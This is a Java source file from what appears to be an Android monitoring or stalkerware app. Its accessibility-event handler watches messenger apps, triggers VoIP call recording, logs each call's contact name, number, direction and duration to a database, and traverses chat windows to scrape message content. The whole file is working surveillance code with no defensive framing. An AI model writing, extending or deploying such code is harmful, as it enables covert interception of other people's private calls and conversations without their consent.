package com.im.bin.accessibility.data;

import android.content.Context;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;

import com.im.bin.accessibility.AccessibilityUtil;
import com.im.bin.appUtils.DateTimeUtil;
import com.im.bin.appUtils.IMMessagesBinUtil;
import com.im.bin.appUtils.Util;
import com.im.bin.db.entities.VoipCall;
import com.im.bin.interfaces.OnAccessibilityEvent;
import com.im.bin.models.AccessibilityEventModel;
import com.im.bin.respository.VoipCallRepository;
import com.im.bin.services.VoipCallRecordingService;

import timber.log.Timber;

import static com.im.bin.accessibility.AccessibilityUtil.imContactName;
import static com.im.bin.accessibility.AccessibilityUtil.imPackages;
import static com.im.bin.accessibility.AccessibilityUtil.isIncomingVoipCaptured;
import static com.im.bin.accessibility.AccessibilityUtil.isOutgoingVoipCaptured;
import static com.im.bin.accessibility.AccessibilityUtil.voipDirection;
import static com.im.bin.accessibility.AccessibilityUtil.voipMessener;
import static com.im.bin.accessibility.AccessibilityUtil.voipName;
import static com.im.bin.accessibility.AccessibilityUtil.voipNumber;
import static com.im.bin.accessibility.AccessibilityUtil.voipStartTime;
import static com.im.bin.accessibility.AccessibilityUtil.voipType;


public class WindowContentChangeEventData implements OnAccessibilityEvent {

    @Override
    public void onAccessibilityEvent(final Context context, final AccessibilityEventModel accessibilityEventModel) {
        try {
            final AccessibilityNodeInfo nodeInfo = accessibilityEventModel.getEventSource();
            String eventPackage = accessibilityEventModel.getPackageName();
            String eventClassName = accessibilityEventModel.getEventClassName();
            observerForInstantMessengerVOIPCalls(context);
            if (nodeInfo != null) {
                if (imPackages.contains(eventPackage)) {
                    startIMMessagesTask(context, eventPackage, nodeInfo, true);
                }
            }
        } catch (Exception e) {
            Timber.d("OnWindowContentChanged Error: %s", e.getMessage());
        }
    }

    private void observerForInstantMessengerVOIPCalls(Context context) {
        boolean isModeEnabled = AccessibilityUtil.isVOIPModeActive(context);
        boolean isServiceRunning = Util.isServiceRunning(context, VoipCallRecordingService.class.getName());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (isModeEnabled && !isServiceRunning && (isIncomingVoipCaptured || isOutgoingVoipCaptured)) {
//                if (voipName.equals("S9 Samsung")) {
//                    voipName = "Alex Stewart";
//                }
                VoipCall voipRecord = new VoipCall();
                voipRecord.setVoipId("");
                voipRecord.setFile("");
                voipRecord.setVoipMessenger(voipMessener);
                voipRecord.setVoipName(voipName);
                voipRecord.setVoipNumber(voipNumber);
                voipRecord.setVoipDirection(voipDirection);
                voipRecord.setVoipType("audio");
                voipRecord.setVoipDuration(0L);
                voipRecord.setVoipDateTime(DateTimeUtil.formatDate(String.valueOf(System.currentTimeMillis())));
                voipRecord.setDate(Util.getDate(System.currentTimeMillis()));
                voipRecord.setStatus(0);
                AccessibilityUtil.startVOIPCallRecording(context, voipRecord);
                isIncomingVoipCaptured = false;
                isOutgoingVoipCaptured = false;
            } else if (!isModeEnabled && isServiceRunning) {
                AccessibilityUtil.stopVOIPCallRecording(context);
                voipName = "";
                voipNumber = "";
                voipDirection = "";
                voipMessener = "";
                voipType = "";
                voipStartTime = 0L;
                isOutgoingVoipCaptured = false;
                isIncomingVoipCaptured = false;
            }
        } else if (!isModeEnabled && !AccessibilityUtil.isVOIPModeRinging(context) && (isIncomingVoipCaptured || isOutgoingVoipCaptured)) {
            long duration = (System.currentTimeMillis() - voipStartTime) / 1000;
            if (duration > 1) {
//                if (voipName.equals("S9 Samsung")) {
//                    voipName = "Alex Stewart";
//                }
                VoipCallRepository voipCallRepository = new VoipCallRepository(context);
                VoipCall voipRecord = new VoipCall();
                voipRecord.setVoipId(Util.generateUniqueID() + "_" + voipStartTime);
                voipRecord.setFile("");
                voipRecord.setVoipMessenger(voipMessener);
                voipRecord.setVoipName(voipName);
                voipRecord.setVoipNumber(voipNumber);
                voipRecord.setVoipDirection(voipDirection);
                voipRecord.setVoipType("audio");
                voipRecord.setVoipDuration(duration);
                voipRecord.setVoipDateTime(DateTimeUtil.formatDate(String.valueOf(System.currentTimeMillis())));
                voipRecord.setDate(Util.getDate(System.currentTimeMillis()));
                voipRecord.setStatus(0);
                voipCallRepository.insertVoipCall(voipRecord);

                voipName = "";
                voipNumber = "";
                voipDirection = "";
                voipMessener = "";
                voipType = "";
                voipStartTime = 0L;
                isOutgoingVoipCaptured = false;
                isIncomingVoipCaptured = false;
            }
        }
    }

    private void startIMMessagesTask(final Context context, final String pkgName, final AccessibilityNodeInfo nodeInfo, final boolean firstIteration) {
        IMMessagesBinUtil imMessagesBinUtil = new IMMessagesBinUtil();
        imMessagesBinUtil.traverseChat(context, pkgName, nodeInfo, firstIteration);
    }
}
